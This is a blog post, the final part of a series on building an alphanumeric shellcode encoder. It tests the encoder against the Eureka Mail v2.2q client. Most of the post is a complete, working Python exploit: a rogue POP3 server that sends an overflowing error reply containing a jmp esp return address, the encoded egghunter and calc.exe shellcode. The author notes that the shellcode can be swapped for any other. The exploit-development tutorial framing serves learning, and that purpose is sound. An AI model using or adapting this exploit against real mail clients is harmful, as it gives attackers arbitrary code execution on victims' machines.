---
layout: article
title: Building an Alphanumeric Encoder Part 4 - Testing the Encoder
permalink: /page/building-an-alphanumeric-encoder-part-4
key: page-article-header-overlay-background-image-HB
cover: /assets/images/posts/alphanumeric-encoder-part-4/cover.png
header:
  theme: dark
  background: 'linear-gradient(135deg, rgb(15, 32, 39), rgb(44, 83, 100))'
article_header:
  type: overlay
  theme: dark
  background_color: '#0F2027'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(15, 32, 39, .6), rgba(44, 83, 100, .6))'
    src: /assets/images/posts/alphanumeric-encoder-part-4/cover.png
---

Testing our alphanumeric encoder on Eureka Mail v2.2q.

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>

## Objective
This is the fourth and final post of a multi-part series exploring the process of creating a custom alphanumeric shellcode encoder. In <a href="http://www.datkev.github.io/page/building-an-alphanumeric-encoder-part-3.html" target="_blank">Part 3</a>, we completed an egghunter encoder that generates the op codes necessary to push a raw egghunter onto the stack.

In this post, we will include the op codes generated by our encoder in a proof-of-concept exploit developed for Eureka Mail v2.2q. If the encoder was successful, we should have code execution on the target machine running Eureka Mail.


## Testing the Encoder

### Proof of Concept
In order to use the op codes generated by our encoder and successfully exploit a program, we must have ESP point to a location where our instruction pointer can reach before the pushing begins. This concept is covered in <a href="http://www.datkev.github.io/page/building-an-alphanumeric-encoder-part-1.html" target="_blank">Part 1</a> of this series as well as an article by the <a href="http://www.datkev.github.io/page/building-an-alphanumeric-encoder-part-2.html" target="_blank">Corelan</a> team.

In an exploit that uses this technique, the instruction pointer will eventually reach the egghunter instructions after the op codes have been pushed and proceed to search in memory for the tag. Once found, the shellcode following the tag will be executed.

Using our egghunter encoder, we will generate op codes to push an NtAccessCheckAndAuditAlarm egghunter onto the stack using only ascii-printable characters.

```
# ./hunter-encoder.py -e 3 -t m0m0
Raw egghunter bytes: 6681CAFF0F42526A0258CD2E3C055A74EFB86d306d308BFAAF75EAAF75E7FFE7

******BLOCK 0*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x2e\x5d\x55\x5d
\x2d\x2e\x5d\x55\x5d
\x2d\x2f\x5e\x55\x5d
\x50
******BLOCK 1*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x70\x2d\x5c\x6f
\x2d\x70\x2e\x5c\x70
\x2d\x71\x2e\x5d\x70
\x50
******BLOCK 2*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x31\x45\x26\x57
\x2d\x31\x45\x27\x57
\x2d\x31\x45\x27\x57
\x50
******BLOCK 3*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x5b\x6c\x30\x45
\x2d\x5b\x6d\x30\x45
\x2d\x5b\x6d\x31\x45
\x50
******BLOCK 4*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x41\x53\x37\x2e
\x2d\x41\x53\x37\x2e
\x2d\x42\x54\x37\x2f
\x50
******BLOCK 5*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x54\x37\x66\x45
\x2d\x55\x38\x66\x45
\x2d\x55\x38\x66\x46
\x50
******BLOCK 6*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x50\x3f\x39\x31
\x2d\x50\x3f\x3a\x32
\x2d\x51\x3f\x3a\x32
\x50
******BLOCK 7*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x33\x2a\x67\x55
\x2d\x33\x2a\x67\x55
\x2d\x34\x2a\x67\x55
\x50
```

Below is a proof of concept exploit for Eureka Mail v2.2q developed in Python. As you can see, we've plugged in our op codes generated by our encoder.

<b>custom_eureka_sploit.py</b>
```py
import socket
import threading

junk = "A"*709
ret = "\xaf\xbc\x47\x7e" # 7E47BCAF -- jmp esp from user32.dll
padding = "\x90"*1000

#m0m0 tag
egghunter = ""
#popad - make ESP point below the encoded hunter
egghunter += "\x61\x61\x61\x61\x61\x61\x61\x61"
#-----8 blocks encoded hunter---------------
#******BLOCK 0*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x2e\x5d\x55\x5d"
egghunter += "\x2d\x2e\x5d\x55\x5d"
egghunter += "\x2d\x2f\x5e\x55\x5d"
egghunter += "\x50"
#******BLOCK 1*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x70\x2d\x5c\x6f"
egghunter += "\x2d\x70\x2e\x5c\x70"
egghunter += "\x2d\x71\x2e\x5d\x70"
egghunter += "\x50"
#******BLOCK 2*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x31\x45\x26\x57"
egghunter += "\x2d\x31\x45\x27\x57"
egghunter += "\x2d\x31\x45\x27\x57"
egghunter += "\x50"
#******BLOCK 3*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x5b\x6c\x30\x45"
egghunter += "\x2d\x5b\x6d\x30\x45"
egghunter += "\x2d\x5b\x6d\x31\x45"
egghunter += "\x50"
#******BLOCK 4*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x41\x53\x37\x2e"
egghunter += "\x2d\x41\x53\x37\x2e"
egghunter += "\x2d\x42\x54\x37\x2f"
egghunter += "\x50"
#******BLOCK 5*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x54\x37\x66\x45"
egghunter += "\x2d\x55\x38\x66\x45"
egghunter += "\x2d\x55\x38\x66\x46"
egghunter += "\x50"
#******BLOCK 6*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x50\x3f\x39\x31"
egghunter += "\x2d\x50\x3f\x3a\x32"
egghunter += "\x2d\x51\x3f\x3a\x32"
egghunter += "\x50"
#******BLOCK 7*******
egghunter += "\x25\x4a\x4d\x4e\x55"
egghunter += "\x25\x35\x32\x31\x2a"
egghunter += "\x2d\x33\x2a\x67\x55"
egghunter += "\x2d\x33\x2a\x67\x55"
egghunter += "\x2d\x34\x2a\x67\x55"
egghunter += "\x50"
#------------------------------
egghunter += "\x41\x41\x41\x41"         #some nops

#calc.exe
shellcode = "m0m0m0m0"
shellcode += "\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"
shellcode += "\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
shellcode += "\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
shellcode += "\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
shellcode += "\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
shellcode += "\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"
shellcode += "\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"
shellcode += "\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"
shellcode += "\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"
shellcode += "\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"
shellcode += "\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"
shellcode += "\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"
shellcode += "\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"
shellcode += "\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"
shellcode += "\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"
shellcode += "\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"
shellcode += "\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"
shellcode += "\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"
shellcode += "\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"
shellcode += "\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"
shellcode += "\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"
shellcode += "\x31\x42\x4c\x42\x43\x45\x50\x41\x41"


payload = junk + ret + egghunter + padding + shellcode


#set up listener on port 110
port=110
ip = "0.0.0.0"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen(5)

print("[+] Listening on TCP port {}".format(ip));
print "[+] Configure Eureka Mail Client to connect to this host\n";


def handle_client(sock):

    print("[+] Client connected from {0}:{1}, sending evil payload\n".format(addr[0],addr[1]))

    while(True):
        sock.send("-ERR " + payload + "\n")
        print("Sent " + str(len(payload)) + " bytes\n")


    sock.close()
    print("[+] Connection closed\n")
    
    
while(True):

    client, addr = server.accept()

    # start new client thread
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()
```
<i>Note: The number of bytes in the junk variable is subject to change depending on the host IP.</i>

The script above will start up a POP3 server which the Eureka Mail Server will connect to.

<img src="/assets/images/posts/alphanumeric-encoder-part-4/01.png" alt="" class="center">

When Eureka Mail connects to TCP port 110 on this server, a long error message will be sent to the client. The error message will contain our payload and enable us to execute arbitrary code on the client machine. For this proof of concept, we will simply execute calc.exe, but the shellcode can be replaced as desired.

### Code Execution

For demonstration purposes, we are running the malicious server on the same machine that is running the Eureka Mail client. Theoretically, the server can be hosted on any remote machine that the client can connect to.

<img src="/assets/images/posts/alphanumeric-encoder-part-4/02.png" alt="" class="center">

<img src="/assets/images/posts/alphanumeric-encoder-part-4/03.png" alt="" class="center">

As soon as the client selects the option to Send and Receive Mail, it establishes a connection with the POP3 server.

<img src="/assets/images/posts/alphanumeric-encoder-part-4/04.png" alt="" class="center">

<img src="/assets/images/posts/alphanumeric-encoder-part-4/05.png" alt="" class="center">

Our script sends the payload which contains our encoded egghunter. As shown below, we can see that the op codes generated by our script were valid and a "m0m0"-tagged calc.exe was found in memory and successfully executed.  

<img src="/assets/images/posts/alphanumeric-encoder-part-4/06.png" alt="" class="center">